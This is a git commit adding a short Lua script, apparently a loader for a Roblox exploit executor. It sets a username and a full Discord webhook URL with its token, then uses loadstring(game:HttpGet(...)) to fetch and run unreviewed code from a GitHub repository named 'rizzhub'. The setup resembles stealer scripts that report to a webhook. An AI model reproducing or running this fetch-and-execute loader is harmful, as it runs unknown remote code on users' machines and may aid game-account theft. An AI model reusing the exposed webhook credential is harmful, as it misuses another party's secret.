6c2b08d3f2de416685ae7b18712e7763c2673b3e
Oaris-69420 <109019792+Oaris-69420@users.noreply.github.com>
2023-03-10 18:32:10 +0545

    Create script.lua

---
+++ script.lua
@@ -0,0 +1,4 @@
+UserName = "OarisFarmAlt"
+Webhook = "https://discord.com/api/webhooks/1083709353661571133/Gg9VlGztsXBMzJSXXaZ7EFE_MTIQNBc0BbjLpRzwSTIX6RzdGLPOyM36MhkaVwFgC_UM"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/New.lua"))()
